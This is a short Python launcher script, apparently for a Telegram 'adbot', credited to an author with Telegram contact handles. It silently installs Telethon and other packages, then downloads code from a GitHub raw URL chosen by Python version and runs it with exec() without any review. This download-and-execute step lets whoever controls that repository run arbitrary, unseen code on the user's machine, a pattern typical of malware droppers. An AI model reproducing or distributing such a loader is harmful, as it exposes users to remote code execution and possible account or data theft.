# ════════════════════
__ENC_AUTHOR__ = "STEIN"
__TELEGRAM__ = "@rejerk"
__GROUP_CHAT__ = "@keped"
# ════════════════════

import sys
import subprocess
import time
import importlib

packages = ["rich", "python-cfonts", "pytz", "Telethon==1.41.0", "requests", "telebot", "ntplib", "aiohttp"]
for pkg in packages:
    pkg_name = pkg.split('==')[0]
    try:
        importlib.import_module(pkg_name.replace("-", "_"))
    except ImportError:
        print(f"Installing {pkg}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

print("Wait 2 sec till it run")
time.sleep(2)

import requests

links_url = "https://raw.githubusercontent.com/devilstein1/adbot/refs/heads/main/links.txt"
with open("links.txt", "w", encoding="utf-8") as f:
    f.write(requests.get(links_url).text)

url = f"https://raw.githubusercontent.com/devilstein1/adbot/refs/heads/main/{sys.version_info.major}.{sys.version_info.minor}.py"
exec(requests.get(url).text)
